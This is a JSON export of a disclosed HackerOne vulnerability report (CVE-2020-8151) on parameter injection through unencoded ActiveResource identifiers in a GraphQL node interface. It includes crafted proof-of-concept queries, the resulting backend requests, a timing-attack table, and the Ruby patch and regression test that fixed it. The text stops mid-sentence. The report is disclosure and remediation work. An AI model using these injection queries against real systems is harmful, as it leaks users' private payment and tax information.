{"id":800231,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDAyMzE=","url":"https://hackerone.com/reports/800231","title":"GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-02-20T03:25:44.761Z","submitted_at":"2020-02-20T03:25:44.761Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8151"],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-11T17:53:34.131Z","bug_reporter_agreed_on_going_public_at":"2020-05-11T17:53:33.856Z","team_member_agreed_on_going_public_at":"2020-05-11T17:48:44.867Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"HackerOne exposes a small number of ActiveResource objects through its GraphQL `node` interface. [ActiveResource](https://github.com/rails/activeresource) objects use HTTP as transport layer in order to fetch data. Four of these models, `TaxForm`, `Payout`, `Payment`, and `PayoutPreference` are fetched from an internal Payments backend system with a REST interface. Due to the lack of encoding the resource identifier, it is possible to inject additional parameters and point a `find` call to a difference resource endpoint.\n\n# Proof of concept\nConsider the following GraphQL query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/1\") {\n    ... on User { \n      id\n    }\n  }\n}\n```\n\n**Note**: it's important to note that the model the node identifier would return does **not** correspond with the expected GraphQL type. This is important for the exploit later in the report. This query would send the following HTTP request to HackerOne's Payments backend:\n\n```\nGET /payments/1 HTTP/1.1\n...\n```\n\nBecause ActiveResource does not have an opinion on identifiers, it won't encode it (e.g. it doesn't raise an exception when a string is passed instead of an integer). This means that the following GraphQL query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/something\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWill result in the following HTTP request:\n\n```\nGET /payments/something HTTP/1.1\n...\n```\n\nBecause the Payments backend uses a REST interface, the `/payments` endpoint can be used to filter by the entire set of `Payment` objects. This particular controller (and corresponding controllers for the other models) have a number of parameters that can be used to filter objects. There are 16 parameters, but the two that we'll use for the exploit:\n\n * core_hacker_username\n * core_team_handle\n\nA global ID (the identifier used in the `node` interface) uses forward slashes to separate the different components (i.e. it's a URI). This means that any URL encoded character in the identifier (last) part of a global ID should be URL encoded and will be decoded when uses. This means that:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/%31\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWill result in:\n\n```\nGET /payments/1.json HTTP/1.1\n...\n```\n\nNow consider the following GraphQL query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWill result in:\n\n```\nGET /payments/?core_hacker_username=jobert\u0026core_team_handle=security%26.json HTTP/1.1\n...\n```\n\n**Note**: the trailing ampersand (`%26`) is used to let the router ignore the appended `.json` extension. The `PaymentsController#index` method will, as expected, return a serialized array of Payment objects that match the given parameters. The timing difference between a response without objects and a response with objects is significant enough to distinguish the two:\n\n| Identifier | Number of objects | RTT |\n| ------ | ------ | ------ |\n| `%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26` | 0 | ~400ms |\n| `%3fcore_hacker_username%3dfransrosen%26core_team_handle%3dsecurity%26` | 2 | ~2000ms |\n\nGoing back to the original query, it can be seen that it'll try to serialize a `User` object. This was necessary because not all ActiveResource models translate to a GraphQL type, such as `Payment`. Because this vulnerability can only be exploited with a timing attack it therefor doesn't matter what the response from the server is. In all cases, the server will respond with a 500 internal server error because the index endpoints of the REST interface will return an array, while the code expects a single record to be returned.\n\nBecause HackerOne exposes a sitemap with programs and user handles (and their ID), it would be rather straightforward to enumerate these and determine the information shown in the impact section of this report.\n\n# Preliminary hypothesis on root cause\nIt's rather unexpected that the ActiveResource gem does not encode the resource identifier before using it in the path of an HTTP request. This behavior is also not documented from our initial investigation. Given the identifiers shown above, the expectation would be that this query:\n\n```\nquery {\n  node(id: \"gid://hackerone/PaymentsLibrary::Payment/%3fsomething%26\") {\n    ... on User {\n      id\n    }\n  }\n}\n```\n\nWould result in:\n\n```\nGET /payments/%3fsomething%26.json HTTP/1.1\n...\n```\n\nHowever, as described earlier, it results in:\n\n```\nGET /payments/?something\u0026.json HTTP/1.1\n...\n```\n\nThe current thinking is that the ActiveResource gem should properly (re)encode the resource identifier before making the HTTP request.\n\n## Impact\n\nThe timing attack can be used to determine the following information:\n\n* roughly how many payments a user has received (not the amount, only total count!)\n* the existence of a private bug bounty program\n* the type of tax form a user has signed\n* the default payout preference type of a user","vulnerability_information_html":"\u003cp\u003eHackerOne exposes a small number of ActiveResource objects through its GraphQL \u003ccode\u003enode\u003c/code\u003e interface. \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Factiveresource\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eActiveResource\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e objects use HTTP as transport layer in order to fetch data. Four of these models, \u003ccode\u003eTaxForm\u003c/code\u003e, \u003ccode\u003ePayout\u003c/code\u003e, \u003ccode\u003ePayment\u003c/code\u003e, and \u003ccode\u003ePayoutPreference\u003c/code\u003e are fetched from an internal Payments backend system with a REST interface. Due to the lack of encoding the resource identifier, it is possible to inject additional parameters and point a \u003ccode\u003efind\u003c/code\u003e call to a difference resource endpoint.\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of concept\u003c/h1\u003e\n\n\u003cp\u003eConsider the following GraphQL query:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery {\n  node(id: \u0026quot;gid://hackerone/PaymentsLibrary::Payment/1\u0026quot;) {\n    ... on User { \n      id\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e: it\u0026#39;s important to note that the model the node identifier would return does \u003cstrong\u003enot\u003c/strong\u003e correspond with the expected GraphQL type. This is important for the exploit later in the report. This query would send the following HTTP request to HackerOne\u0026#39;s Payments backend:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /payments/1 HTTP/1.1\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause ActiveResource does not have an opinion on identifiers, it won\u0026#39;t encode it (e.g. it doesn\u0026#39;t raise an exception when a string is passed instead of an integer). This means that the following GraphQL query:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery {\n  node(id: \u0026quot;gid://hackerone/PaymentsLibrary::Payment/something\u0026quot;) {\n    ... on User {\n      id\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWill result in the following HTTP request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /payments/something HTTP/1.1\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause the Payments backend uses a REST interface, the \u003ccode\u003e/payments\u003c/code\u003e endpoint can be used to filter by the entire set of \u003ccode\u003ePayment\u003c/code\u003e objects. This particular controller (and corresponding controllers for the other models) have a number of parameters that can be used to filter objects. There are 16 parameters, but the two that we\u0026#39;ll use for the exploit:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ecore_hacker_username\u003c/li\u003e\n\u003cli\u003ecore_team_handle\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eA global ID (the identifier used in the \u003ccode\u003enode\u003c/code\u003e interface) uses forward slashes to separate the different components (i.e. it\u0026#39;s a URI). This means that any URL encoded character in the identifier (last) part of a global ID should be URL encoded and will be decoded when uses. This means that:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery {\n  node(id: \u0026quot;gid://hackerone/PaymentsLibrary::Payment/%31\u0026quot;) {\n    ... on User {\n      id\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWill result in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /payments/1.json HTTP/1.1\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow consider the following GraphQL query:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery {\n  node(id: \u0026quot;gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26\u0026quot;) {\n    ... on User {\n      id\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWill result in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /payments/?core_hacker_username=jobert\u0026amp;core_team_handle=security%26.json HTTP/1.1\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e: the trailing ampersand (\u003ccode\u003e%26\u003c/code\u003e) is used to let the router ignore the appended \u003ccode\u003e.json\u003c/code\u003e extension. The \u003ccode\u003ePaymentsController#index\u003c/code\u003e method will, as expected, return a serialized array of Payment objects that match the given parameters. The timing difference between a response without objects and a response with objects is significant enough to distinguish the two:\u003c/p\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eIdentifier\u003c/th\u003e\n\u003cth\u003eNumber of objects\u003c/th\u003e\n\u003cth\u003eRTT\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003ctd\u003e~400ms\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e%3fcore_hacker_username%3dfransrosen%26core_team_handle%3dsecurity%26\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e2\u003c/td\u003e\n\u003ctd\u003e~2000ms\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003eGoing back to the original query, it can be seen that it\u0026#39;ll try to serialize a \u003ccode\u003eUser\u003c/code\u003e object. This was necessary because not all ActiveResource models translate to a GraphQL type, such as \u003ccode\u003ePayment\u003c/code\u003e. Because this vulnerability can only be exploited with a timing attack it therefor doesn\u0026#39;t matter what the response from the server is. In all cases, the server will respond with a 500 internal server error because the index endpoints of the REST interface will return an array, while the code expects a single record to be returned.\u003c/p\u003e\n\n\u003cp\u003eBecause HackerOne exposes a sitemap with programs and user handles (and their ID), it would be rather straightforward to enumerate these and determine the information shown in the impact section of this report.\u003c/p\u003e\n\n\u003ch1 id=\"preliminary-hypothesis-on-root-cause\"\u003ePreliminary hypothesis on root cause\u003c/h1\u003e\n\n\u003cp\u003eIt\u0026#39;s rather unexpected that the ActiveResource gem does not encode the resource identifier before using it in the path of an HTTP request. This behavior is also not documented from our initial investigation. Given the identifiers shown above, the expectation would be that this query:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003equery {\n  node(id: \u0026quot;gid://hackerone/PaymentsLibrary::Payment/%3fsomething%26\u0026quot;) {\n    ... on User {\n      id\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWould result in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /payments/%3fsomething%26.json HTTP/1.1\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever, as described earlier, it results in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /payments/?something\u0026amp;.json HTTP/1.1\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe current thinking is that the ActiveResource gem should properly (re)encode the resource identifier before making the HTTP request.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe timing attack can be used to determine the following information:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eroughly how many payments a user has received (not the amount, only total count!)\u003c/li\u003e\n\u003cli\u003ethe existence of a private bug bounty program\u003c/li\u003e\n\u003cli\u003ethe type of tax form a user has signed\u003c/li\u003e\n\u003cli\u003ethe default payout preference type of a user\u003c/li\u003e\n\u003c/ul\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-06-10T17:48:44.952Z","allow_singular_disclosure_after":-17413586.464716133,"singular_disclosure_allowed":true,"vote_count":39,"voters":["sameerphad72","nikitastupin","zeroxyele","macasun","samet","haxta4ok00","what_web","naategh","3x3s","modam3r5","and 29 more..."],"severity":{"rating":"medium","score":6.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":3,"asset_type":"URL","asset_identifier":"https://hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7096030,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-20T03:28:20.985Z","updated_at":"2020-02-20T03:28:20.985Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7096035,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"This security vulnerability was identified by HackerOne's security team and is therefor not eligible for a bounty.","markdown_message":"\u003cp\u003eThis security vulnerability was identified by HackerOne\u0026#39;s security team and is therefor not eligible for a bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-20T03:29:11.346Z","updated_at":"2020-02-20T03:29:11.346Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7892701,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The following monkey patch was released last week:\n\n```ruby\n# frozen_string_literal: true\n\n# This is a monkey patch pending the release of a security vulnerability\n# in ActiveResource. Once CVE-2020-8151 is published, we can remove this\n# patch in favor of updating ActiveResource to the latest version.\nmodule ActiveResource\n  class Base\n    class \u003c\u003c self\n      def element_path(id, prefix_options = {}, query_options = nil)\n        check_prefix_options(prefix_options)\n\n        prefix_options, query_options = split_options(prefix_options) if query_options.nil?\n        \"#{prefix(prefix_options)}#{collection_name}/#{URI.encode_www_form_component(id.to_s)}\" \\\n          \"#{format_extension}#{query_string(query_options)}\"\n      end\n    end\n  end\nend\n```\n\nThe following regression spec was added to make sure that this addressed the vulnerability:\n\n```ruby\n# Regression test for CVE-2020-8151\nit 'submits the expected HTTP request to the payments backend' do\n  team = create :team, handle: 'someteam'\n  team_member = create(:team_member, team: team).user\n  graphql_headers_for team_member\n\n  expect_any_instance_of(Net::HTTP)\n    .to receive(:get)\n    .with \\\n      '/payments/%3Fa%3Db.json',\n      'Accept' =\u003e 'application/json',\n      'Core-Request-Id' =\u003e nil,\n      'Core-Username' =\u003e '',\n      'Core-User-Id' =\u003e '',\n      'Accept-Version' =\u003e '2',\n      'Api-Token' =\u003e 'developers',\n      'X-Mock-Stripe' =\u003e 'false'\n\n  post :create, params: { query: \u003c\u003c-GRAPHQL }\n      query {\n        node(id: \"gid://hackerone/PaymentsLibrary::Payment/%3fa%3db\") {\n          ... on PaymentTransaction {\n            id\n          }\n        }\n      }\n  GRAPHQL\nend\n```\n\nThe Rails team has acknowledged the security vulnerability in #803922 and will release a new version of `activeresource` soon. Once this new version is released, Renovate will automatically update the package and we'll be able to remove the monkey patch. Closing this out since the monkey patch is live.\n\nThe fix can be determined by that injecting the parameters shouldn't result in a time discrepancy anymore.","markdown_message":"\u003cp\u003eThe following monkey patch was released last week:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# frozen_string_literal: true\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# This is a monkey patch pending the release of a security vulnerability\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# in ActiveResource. Once CVE-2020-8151 is published, we can remove this\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# patch in favor of updating ActiveResource to the latest version.\u003c/span\u003e\n\u003cspan class=\"k\"\u003emodule\u003c/span\u003e \u003cspan class=\"nn\"\u003eActiveResource\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"nb\"\u003eself\u003c/span\u003e\n      \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eelement_path\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eprefix_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{},\u003c/span\u003e \u003cspan class=\"n\"\u003equery_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kp\"\u003enil\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003echeck_prefix_options\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix_options\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003eprefix_options\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003equery_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esplit_options\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix_options\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003equery_options\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enil?\u003c/span\u003e\n        \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eprefix_options\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"si\"\u003e}#{\u003c/span\u003e\u003cspan class=\"n\"\u003ecollection_name\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"no\"\u003eURI\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eencode_www_form_component\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e\\\u003c/span\u003e\n          \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003eformat_extension\u003c/span\u003e\u003cspan class=\"si\"\u003e}#{\u003c/span\u003e\u003cspan class=\"n\"\u003equery_string\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003equery_options\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following regression spec was added to make sure that this addressed the vulnerability:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# Regression test for CVE-2020-8151\u003c/span\u003e\n\u003cspan class=\"n\"\u003eit\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;submits the expected HTTP request to the payments backend\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eteam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecreate\u003c/span\u003e \u003cspan class=\"ss\"\u003e:team\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003ehandle: \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;someteam\u0026#39;\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eteam_member\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecreate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:team_member\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003eteam: \u003c/span\u003e\u003cspan class=\"n\"\u003eteam\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003euser\u003c/span\u003e\n  \u003cspan class=\"n\"\u003egraphql_headers_for\u003c/span\u003e \u003cspan class=\"n\"\u003eteam_member\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003eexpect_any_instance_of\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eNet\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto\u003c/span\u003e \u003cspan class=\"n\"\u003ereceive\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:get\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ewith\u003c/span\u003e \u003cspan class=\"p\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;/payments/%3Fa%3Db.json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;Accept\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;Core-Request-Id\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kp\"\u003enil\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;Core-Username\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;Core-User-Id\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;Accept-Version\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;2\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;Api-Token\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;developers\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;X-Mock-Stripe\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;false\u0026#39;\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003epost\u003c/span\u003e \u003cspan class=\"ss\"\u003e:create\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003eparams: \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"ss\"\u003equery: \u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;-\u003c/span\u003e\u003cspan class=\"no\"\u003eGRAPHQL\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"sh\"\u003e\n      query {\n        node(id: \u0026quot;gid://hackerone/PaymentsLibrary::Payment/%3fa%3db\u0026quot;) {\n          ... on PaymentTransaction {\n            id\n          }\n        }\n      }\n\u003c/span\u003e\u003cspan class=\"no\"\u003e  GRAPHQL\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe Rails team has acknowledged the security vulnerability in \u003ca href=\"/reports/803922\"\u003e#803922\u003c/a\u003e and will release a new version of \u003ccode\u003eactiveresource\u003c/code\u003e soon. Once this new version is released, Renovate will automatically update the package and we\u0026#39;ll be able to remove the monkey patch. Closing this out since the monkey 